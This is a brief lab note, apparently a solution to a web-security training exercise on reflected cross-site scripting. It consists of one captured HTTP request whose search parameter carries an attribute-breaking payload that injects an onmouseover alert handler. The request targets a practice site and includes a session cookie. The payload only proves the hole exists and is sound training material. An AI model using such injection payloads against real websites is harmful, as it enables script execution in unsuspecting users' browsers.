# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

GET /?search="onmouseover="alert(1) HTTP/2
Host: 0a6300d604a394ef805b3068001d00f5.web-security-academy.net
Cookie: session=YWgLl3SANDRlRoFs9VCH5mRbiWJU87jB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a6300d604a394ef805b3068001d00f5.web-security-academy.net/?search=%22onmouseover%3D%22alert%281%29
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

